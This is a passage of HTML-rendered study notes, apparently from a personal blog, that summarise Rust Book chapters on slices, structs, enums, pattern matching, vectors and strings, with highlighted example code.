class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello world&quot;</span>);<br>    <span class="hljs-keyword">let</span> word = first_word(&amp;s); <span class="hljs-comment">// word will get the value 5</span><br>    s.clear(); <span class="hljs-comment">// this empties the String, making it equal to &quot;&quot;</span><br>    <span class="hljs-comment">// word still has the value 5 here, but there&#x27;s no more string that</span><br>    <span class="hljs-comment">// we could meaningfully use the value 5 with. word is now totally invalid!</span><br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>return a <em>string slice</em> instead of an index </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">first_word</span></span>(s: &amp;<span class="hljs-built_in">String</span>) -&gt; &amp;<span class="hljs-built_in">str</span> &#123;<span class="hljs-comment">//The type that signifies “string slice” is written as &amp;str</span><br>    <span class="hljs-keyword">let</span> bytes = s.as_bytes();<br>    <span class="hljs-keyword">for</span> (i, &amp;item) <span class="hljs-keyword">in</span> bytes.iter().enumerate() &#123;<br>        <span class="hljs-keyword">if</span> item == <span class="hljs-string">b&#x27; &#x27;</span> &#123;<br>            <span class="hljs-keyword">return</span> &amp;s[<span class="hljs-number">0</span>..i];<br>        &#125;<br>    &#125;<br>    &amp;s[..] <span class="hljs-comment">//equals &amp;s[0..len]</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;&#125;<br></code></pre></div></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">first_word</span></span>(s: &amp;<span class="hljs-built_in">str</span>) -&gt; &amp;<span class="hljs-built_in">str</span> &#123;&#125;<span class="hljs-comment">//use the same function on both &amp;String values and &amp;str values.</span><br></code></pre></div></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-keyword">let</span> my_string = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;hello world&quot;</span>);<br><br>    <span class="hljs-comment">// first_word works on slices of `String`s</span><br>    <span class="hljs-keyword">let</span> word = first_word(&amp;my_string[..]);<br><br>    <span class="hljs-keyword">let</span> my_string_literal = <span class="hljs-string">&quot;hello world&quot;</span>;<br><br>    <span class="hljs-comment">// first_word works on slices of string literals</span><br>    <span class="hljs-keyword">let</span> word = first_word(&amp;my_string_literal[..]);<br><br>    <span class="hljs-comment">// Because string literals *are* string slices already,</span><br>    <span class="hljs-comment">// this works too, without the slice syntax!</span><br>    <span class="hljs-keyword">let</span> word = first_word(my_string_literal);<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="stuct"><a href="#stuct" class="headerlink" title="stuct"></a>stuct</h1><ul><li>Rust doesn’t allow us to mark only certain fields as mutable. As with any expression, we can construct a new instance of the struct as the last expression in the function body to implicitly return that new instance.</li><li>Unit-like structs can be useful in situations in which you need to implement a trait on some type but don’t have any data that you want to store in the type itself</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-meta">#[derive(Debug)]</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Person</span></span> &#123;<br>    name: <span class="hljs-built_in">String</span>,<br>    age: <span class="hljs-built_in">u8</span>,<br>&#125;<br><br><span class="hljs-comment">// A unit struct</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Unit</span></span>;<br><br><span class="hljs-comment">// A tuple struct</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Pair</span></span>(<span class="hljs-built_in">i32</span>, <span class="hljs-built_in">f32</span>);<br><br><span class="hljs-comment">// A struct with two fields</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Point</span></span> &#123;<br>    x: <span class="hljs-built_in">f32</span>,<br>    y: <span class="hljs-built_in">f32</span>,<br>&#125;<br><br><span class="hljs-comment">// Structs can be reused as fields of another struct</span><br><span class="hljs-meta">#[allow(dead_code)]</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Rectangle</span></span> &#123;<br>    <span class="hljs-comment">// A rectangle can be specified by where the top left and bottom right</span><br>    <span class="hljs-comment">// corners are in space.</span><br>    top_left: Point,<br>    bottom_right: Point,<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-comment">// Create struct with field init shorthand</span><br>    <span class="hljs-keyword">let</span> name = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;Peter&quot;</span>);<br>    <span class="hljs-keyword">let</span> age = <span class="hljs-number">27</span>;<br>    <span class="hljs-keyword">let</span> peter = Person &#123; name, age &#125;;<br><br>    <span class="hljs-comment">// Print debug struct</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;&#123;:?&#125;&quot;</span>, peter);<br><br><br>    <span class="hljs-comment">// Instantiate a `Point`</span><br>    <span class="hljs-keyword">let</span> point: Point = Point &#123; x: <span class="hljs-number">10.3</span>, y: <span class="hljs-number">0.4</span> &#125;;<br><br>    <span class="hljs-comment">// Access the fields of the point</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;point coordinates: (&#123;&#125;, &#123;&#125;)&quot;</span>, point.x, point.y);<br><br>    <span class="hljs-comment">// Make a new point by using struct update syntax to use the fields of our</span><br>    <span class="hljs-comment">// other one</span><br>    <span class="hljs-keyword">let</span> bottom_right = Point &#123; x: <span class="hljs-number">5.2</span>, ..point &#125;;<br><br>    <span class="hljs-comment">// `bottom_right.y` will be the same as `point.y` because we used that field</span><br>    <span class="hljs-comment">// from `point`</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;second point: (&#123;&#125;, &#123;&#125;)&quot;</span>, bottom_right.x, bottom_right.y);<br><br>    <span class="hljs-comment">// Destructure the point using a `let` binding</span><br>    <span class="hljs-keyword">let</span> Point &#123; x: left_edge, y: top_edge &#125; = point;<br><br>    <span class="hljs-keyword">let</span> _rectangle = Rectangle &#123;<br>        <span class="hljs-comment">// struct instantiation is an expression too</span><br>        top_left: Point &#123; x: left_edge, y: top_edge &#125;,<br>        bottom_right: bottom_right,<br>    &#125;;<br><br>    <span class="hljs-comment">// Instantiate a unit struct</span><br>    <span class="hljs-keyword">let</span> _unit = Unit;<br><br>    <span class="hljs-comment">// Instantiate a tuple struct</span><br>    <span class="hljs-keyword">let</span> pair = Pair(<span class="hljs-number">1</span>, <span class="hljs-number">0.1</span>);<br><br>    <span class="hljs-comment">// Access the fields of a tuple struct</span><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;pair contains &#123;:?&#125; and &#123;:?&#125;&quot;</span>, pair.<span class="hljs-number">0</span>, pair.<span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">// Destructure a tuple struct</span><br>    <span class="hljs-keyword">let</span> Pair(integer, decimal) = pair;<br><br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;pair contains &#123;:?&#125; and &#123;:?&#125;&quot;</span>, integer, decimal);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>Refactoring with Structs: Adding More Meaning: <strong><u>use struct to wrap relative fields</u></strong> </li><li><strong>print the struct by <code>println!()</code></strong> will get an error, and because struct don’t have a provided implementation of <code>Display</code>, we can only use the <code>#[derived(Debug)]</code> just before the struct definition. Then use <code>“&#123;:?&#125;”</code> or <code>“&#123;:#?&#125;”</code> as the formatter.</li></ul><blockquote><p>Rust has provided a number of traits for us to use with the <code>derive</code> annotation that can add useful behavior to our custom types. Those traits and their behaviors are listed in <a href="https://doc.rust-lang.org/book/appendix-03-derivable-traits.html">Appendix C</a>. We’ll cover how to implement these traits with custom behavior as well as how to create your own traits in Chapter 10.</p></blockquote><h2 id="Method-syntax"><a href="#Method-syntax" class="headerlink" title="Method syntax"></a>Method syntax</h2><ul><li><p><a href="https://doc.rust-lang.org/book/ch05-03-method-syntax.html#method-syntax">definition</a> :they’re defined <strong>within the context of a struct</strong> (or an enum or a trait object) ……</p></li><li><p>intention: We’ve put all the things we can do with an instance of a type in one <code>impl</code> block rather than making future users of our code search for capabilities of <code>Rectangle</code> in various places in the library we provide.</p></li><li><p><em>automatic referencing and dereferencing</em> : when you call a method with <code>object.something()</code>, Rust automatically adds in <code>&amp;</code>, <code>&amp;mut</code>, or <code>*</code> so <code>object</code> matches the signature of the method. In other words, the following are the same:</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust">p1.distance(&amp;p2);<br>(&amp;p1).distance(&amp;p2);<br></code></pre></div></td></tr></table></figure></li><li><h3 id="Associated-Functions"><a href="#Associated-Functions" class="headerlink" title="Associated Functions"></a><a href="https://doc.rust-lang.org/book/ch05-03-method-syntax.html#associated-functions">Associated Functions</a></h3><ul><li><code>impl</code> blocks allow us to define functions within <code>impl</code> blocks that <em>don’t</em> take <code>self</code> as a parameter. The usage is just like <code>String::from</code>, often used in struct builder.</li></ul></li></ul><h1 id="Enums-and-Pattern-Matching"><a href="#Enums-and-Pattern-Matching" class="headerlink" title="Enums and Pattern Matching"></a><a href="https://doc.rust-lang.org/book/ch06-00-enums.html#enums-and-pattern-matching">Enums and Pattern Matching</a></h1><h2 id="enum"><a href="#enum" class="headerlink" title="enum"></a>enum</h2><ul><li><p>Defining an enum with variants such as the ones in Listing 6-2 is similar to defining different kinds of struct definitions, except the enum doesn’t use the <code>struct</code> keyword and all the variants are grouped together under the <code>Message</code> type.</p></li><li><p>we can define methods on struct and the enums.</p></li><li><p><a href="https://doc.rust-lang.org/book/ch06-01-defining-an-enum.html#the-option-enum-and-its-advantages-over-null-values">The <code>Option</code> Enum and Its Advantages Over Null Values</a></p><ul><li><p>As such, Rust does not have nulls, but it does have an enum that can encode the concept of a value being present or absent. This enum is <code>Option&lt;T&gt;</code> and it is <a href="https://doc.rust-lang.org/std/option/enum.Option.html">defined by the standard library</a> as follows:</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Option</span></span>&lt;T&gt; &#123;<br>    <span class="hljs-literal">None</span>,<br>    <span class="hljs-literal">Some</span>(T),<br>&#125;<br></code></pre></div></td></tr></table></figure><p>The <code>&lt;T&gt;</code> syntax is generic type parameter.(就跟模板是一样的)</p></li><li><p>So why is having <code>Option&lt;T&gt;</code> any better than having null? In short, because <code>Option&lt;T&gt;</code> and <code>T</code> (where <code>T</code> can be any type) are <strong>different types</strong>, the common_used_operation won’t work.</p></li></ul></li></ul><h2 id="match"><a href="#match" class="headerlink" title="match"></a>match</h2><h3 id="Patterns-that-Bind-to-Values"><a href="#Patterns-that-Bind-to-Values" class="headerlink" title="Patterns that Bind to Values"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#patterns-that-bind-to-values">Patterns that Bind to Values</a></h3><p>This is how we can extract values out of enum variants.</p><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-meta">#[derive(Debug)]</span> <span class="hljs-comment">// so we can inspect the state in a minute</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">UsState</span></span> &#123;<br>    Alabama,<br>    Alaska,<br>    <span class="hljs-comment">// --snip--</span><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Coin</span></span> &#123;<br>    Penny,<br>    Nickel,<br>    Dime,<br>    Quarter(UsState),<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">value_in_cents</span></span>(coin: Coin) -&gt; <span class="hljs-built_in">u8</span> &#123; <span class="hljs-comment">//If we were to call value_in_cents(Coin::Quarter(UsState::Alaska))</span><br>    <span class="hljs-keyword">match</span> coin &#123;<br>        Coin::Penny =&gt; <span class="hljs-number">1</span>,<br>        Coin::Nickel =&gt; <span class="hljs-number">5</span>,<br>        Coin::Dime =&gt; <span class="hljs-number">10</span>,<br>        Coin::Quarter(state) =&gt; &#123; <span class="hljs-comment">//then we can use the state variable</span><br>            <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;State quarter from &#123;:?&#125;!&quot;</span>, state);<br>            <span class="hljs-number">25</span><br>&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="Matching-with-Option-lt-T-gt"><a href="#Matching-with-Option-lt-T-gt" class="headerlink" title="Matching with Option&lt;T&gt;"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#matching-with-optiont">Matching with <code>Option&lt;T&gt;</code></a></h3><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">main</span></span>() &#123;<br>    <span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">plus_one</span></span>(x: <span class="hljs-built_in">Option</span>&lt;<span class="hljs-built_in">i32</span>&gt;) -&gt; <span class="hljs-built_in">Option</span>&lt;<span class="hljs-built_in">i32</span>&gt; &#123;<br>        <span class="hljs-keyword">match</span> x &#123;<br>            <span class="hljs-literal">None</span> =&gt; <span class="hljs-literal">None</span>,<br>            <span class="hljs-literal">Some</span>(i) =&gt; <span class="hljs-literal">Some</span>(i + <span class="hljs-number">1</span>),<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">let</span> five = <span class="hljs-literal">Some</span>(<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">let</span> six = plus_one(five);<br>    <span class="hljs-keyword">let</span> none = plus_one(<span class="hljs-literal">None</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>Combining <code>match</code> and enums is useful in many situations. You’ll see this pattern a lot in Rust code: </p><ol><li><code>match</code> against an enum, </li><li>bind a variable to the data inside, and then execute code based on it. </li></ol><p>It’s a bit tricky at first, but once you get used to it, <strong>you’ll wish you had it in all languages</strong>. It’s consistently a user favorite.</p></li></ul><h3 id="Matches-Are-Exhaustive"><a href="#Matches-Are-Exhaustive" class="headerlink" title="Matches Are Exhaustive"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#matches-are-exhaustive">Matches Are Exhaustive</a></h3><ul><li>Matches in Rust are <em>exhaustive</em>: we must exhaust <u>every last possibility in order for the code to be valid</u>. Especially in the case of <code>Option&lt;T&gt;</code>, when Rust prevents us from forgetting to explicitly handle the <code>None</code> case, it protects us from assuming that we have a value when we might have null, thus making the billion-dollar mistake discussed earlier impossible.</li></ul><h3 id="The-Placeholder"><a href="#The-Placeholder" class="headerlink" title="The _ Placeholder"></a><a href="https://doc.rust-lang.org/book/ch06-02-match.html#the-_-placeholder">The <code>_</code> Placeholder</a></h3><ul><li>The <code>_</code> pattern will match any value.</li></ul><h2 id="Concise-Control-Flow-with-if-let"><a href="#Concise-Control-Flow-with-if-let" class="headerlink" title="Concise Control Flow with if let"></a><a href="https://doc.rust-lang.org/book/ch06-03-if-let.html#concise-control-flow-with-if-let">Concise Control Flow with <code>if let</code></a></h2><ul><li>In other words, you can think of <code>if let</code> as <strong>syntax sugar</strong> for a <code>match</code> that runs code when the value matches <strong>one pattern</strong> and then ignores all other values.</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> some_u8_value = <span class="hljs-literal">Some</span>(<span class="hljs-number">0u8</span>);<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-literal">Some</span>(<span class="hljs-number">3</span>) = some_u8_value &#123;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;three&quot;</span>);<br>&#125;<span class="hljs-comment">// here can add an &quot;else&quot;</span><br><span class="hljs-comment">//equals</span><br><span class="hljs-keyword">match</span> some_u8_value &#123;<br>    <span class="hljs-literal">Some</span>(<span class="hljs-number">3</span>) =&gt; <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;three&quot;</span>),<br>    _ =&gt; (),<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="Managing-Growing-Projects-with-Packages-Crates-and-Modules"><a href="#Managing-Growing-Projects-with-Packages-Crates-and-Modules" class="headerlink" title="Managing Growing Projects with Packages, Crates, and Modules"></a><a href="https://doc.rust-lang.org/book/ch07-00-managing-growing-projects-with-packages-crates-and-modules.html#managing-growing-projects-with-packages-crates-and-modules">Managing Growing Projects with Packages, Crates, and Modules</a></h1><h1 id="Common-Collections"><a href="#Common-Collections" class="headerlink" title="Common Collections"></a><a href="https://doc.rust-lang.org/book/ch08-00-common-collections.html#common-collections">Common Collections</a></h1><h2 id="Vectors"><a href="#Vectors" class="headerlink" title="Vectors"></a><a href="https://doc.rust-lang.org/book/ch08-01-vectors.html#storing-lists-of-values-with-vectors">Vectors</a></h2><h3 id="common-operation"><a href="#common-operation" class="headerlink" title="common operation"></a>common operation</h3><ul><li>Rust provides the <code>vec!</code> macro for convenience. <code>let v = vec![1, 2, 3];</code>  or  <code>let v: Vec&lt;i32&gt; = Vec::new();</code></li><li>use .push() to add elements</li><li>Dropping a Vector Drops Its Elements</li><li>read elements<ul><li>First method is best used when you want your program to crash if there’s an attempt to access an element past the end of the vector.</li><li>When the <code>get</code> method is passed an index that is outside the vector, it returns <code>None</code> without panicking</li></ul></li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> v = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><br><span class="hljs-keyword">let</span> does_not_exist = &amp;v[<span class="hljs-number">100</span>];<br><span class="hljs-keyword">let</span> does_not_exist = v.get(<span class="hljs-number">100</span>);<br></code></pre></div></td></tr></table></figure><ul><li>following code won’t work, because vec may be copied to a new place </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> v = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];<br><span class="hljs-keyword">let</span> first = &amp;v[<span class="hljs-number">0</span>];<br>v.push(<span class="hljs-number">6</span>);<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;The first element is: &#123;&#125;&quot;</span>, first);<br></code></pre></div></td></tr></table></figure><ul><li>To change the value that the mutable reference refers to, we have to use the dereference operator (<code>*</code>) to get to the value in <code>i</code> before we can use the <code>+=</code> operator</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &amp;<span class="hljs-keyword">mut</span> v &#123;  <span class="hljs-comment">//let mut v = vec![100, 32, 57];</span><br>    *i += <span class="hljs-number">50</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="Using-an-Enum-to-Store-Multiple-Types"><a href="#Using-an-Enum-to-Store-Multiple-Types" class="headerlink" title="Using an Enum to Store Multiple Types"></a><a href="https://doc.rust-lang.org/book/ch08-01-vectors.html#using-an-enum-to-store-multiple-types">Using an Enum to Store Multiple Types</a></h3><ul><li>when we need to store elements of a different type in a vector, we can define and use an enum!</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">SpreadsheetCell</span></span> &#123;<br>    Int(<span class="hljs-built_in">i32</span>),<br>    Float(<span class="hljs-built_in">f64</span>),<br>    Text(<span class="hljs-built_in">String</span>),<br>&#125;<br><span class="hljs-keyword">let</span> row = <span class="hljs-built_in">vec!</span>[<br>    SpreadsheetCell::Int(<span class="hljs-number">3</span>),<br>    SpreadsheetCell::Text(<span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;blue&quot;</span>)),<br>    SpreadsheetCell::Float(<span class="hljs-number">10.12</span>),<br>];<br></code></pre></div></td></tr></table></figure><h2 id="string-DOC"><a href="#string-DOC" class="headerlink" title="string(DOC)"></a>string(<a href="https://doc.rust-lang.org/stable/std/string/struct.String.html">DOC</a>)</h2><ul><li>For that, we use the <code>to_string</code> method, which is available on <strong>any type</strong> that implements the <code>Display</code> trait, as string literals do. </li><li>we can find out that the implementation of string is Vec.</li></ul><h3 id="CREATE-A-NEW-STRING"><a href="#CREATE-A-NEW-STRING" class="headerlink" title="CREATE A NEW STRING"></a>CREATE A NEW STRING</h3><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><br><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s = <span class="hljs-built_in">String</span>::new();<br><span class="hljs-keyword">let</span> data = <span class="hljs-string">&quot;initial contents&quot;</span>;<br><span class="hljs-keyword">let</span> s = data.to_string();<br><span class="hljs-comment">// the method also works on a literal directly:</span><br><span class="hljs-keyword">let</span> s = <span class="hljs-string">&quot;initial contents&quot;</span>.to_string();<br><span class="hljs-comment">// or you can:</span><br><span class="hljs-keyword">let</span> s = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;initial contents&quot;</span>);<br><span class="hljs-comment">//strings are UTF-8 encoded, so we can include any properly encoded data, like:</span><br><span class="hljs-keyword">let</span> hello = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;السلام عليكم&quot;</span>);<br><br><br></code></pre></div></td></tr></table></figure><h3 id="UPDATING-THE-STRING"><a href="#UPDATING-THE-STRING" class="headerlink" title="UPDATING THE STRING"></a>UPDATING THE STRING</h3><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust">s.push_str(<span class="hljs-string">&quot;initial&quot;</span>);<span class="hljs-comment">//it&#x27;s a method</span><br>s.push(<span class="hljs-string">&#x27;l&#x27;</span>);<span class="hljs-comment">//push single character and single quote</span><br>s = s1 + s2;<span class="hljs-comment">//the &#x27;+&#x27; operation use the add() method</span><br></code></pre></div></td></tr></table></figure><ul><li>pay attention to the ownership taking</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword">mut</span> s1 = <span class="hljs-built_in">String</span>::from(<span class="hljs-string">&quot;foo&quot;</span>);<br><span class="hljs-keyword">let</span> s2 = <span class="hljs-string">&quot;bar&quot;</span>;<br>s1.push_str(s2);<br><span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;s2 is &#123;&#125;&quot;</span>, s2);<br></code></pre></div></td></tr></table></figure><ul><li><em><strong>deref coercion</strong></em>: why does the first line compile ? Because Rust compiler can coerce <code>&amp;String</code> into a <code>&amp;str</code> </li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs rust"><span class="hljs-keyword">let</span> s3 = s1 + &amp;s2;<span class="hljs-comment">//they are all strings, compiler turns &amp;s2 into &amp;s2[..], and s1 has been moved </span><br><br><span class="hljs-function"><span class="hljs-keyword">fn</span> <span class="hljs-title">add</span></span>(<span class="hljs-keyword">self</span>, s: &amp;<span class="hljs-built_in">str</span>) -&gt; <span class="hljs-built_in">String</span> &#123;<span class="hljs-comment">//add&#x27;s signature, s1 don&#x27;t have &#x27;&amp;&#x27; which will take the ownership</span><br></code></pre></div></td></tr></table></figure><ul><li>For more complicated string <strong>combining</strong>, we can use the <code>format!</code> macro</li></ul><figure class="highlight rust"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 